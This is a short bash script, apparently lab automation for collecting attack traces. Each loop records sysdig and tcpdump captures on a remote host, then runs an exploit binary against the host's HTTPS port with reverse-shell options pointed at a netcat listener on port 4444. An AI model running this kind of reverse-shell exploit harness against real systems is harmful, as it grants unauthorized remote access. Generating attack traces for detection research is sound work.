#!/bin/bash


for i in $(eval echo {$1..$2})
do
ssh -i ./server.pem softseclab@10.176.147.83  sudo sysdig_cap -w stream-$i.scap -z -s 4096 container.name=fullpatch and proc.name!=criu and proc.name!=init and proc.name!=systemd-udevd and proc.name!=upstart-udev-br and proc.name!=upstart-socket- and proc.name!=upstart-file-br and proc.name!=sh and proc.name!=iptables and proc.name!=cat and proc.name!=tcpdump &

ssh -i ./server.pem softseclab@10.176.147.83 sudo nohup tcpdump_cap -i eth0 -s0 -w stream-$i.cap port not 22 and port not 3490 and port not 3492 and port not 3790 and port not 80 >pdump.out &

sleep 5 
ssh -i ./server.pem softseclab@10.176.147.83 nc -l -p 4444 &
sleep 2
./29290 --target 10.176.147.83 --port 443 --protocol https --reverse-ip 10.0.3.1 --reverse-port 4444

sleep 5

ssh -i ./server.pem softseclab@10.176.147.83 sudo killall -s SIGINT sysdig_cap
ssh -i ./server.pem softseclab@10.176.147.83 sudo killall -s SIGINT tcpdump_cap
ssh -i ./server.pem softseclab@10.176.147.83 sudo killall -s SIGINT nc



sleep 4
done
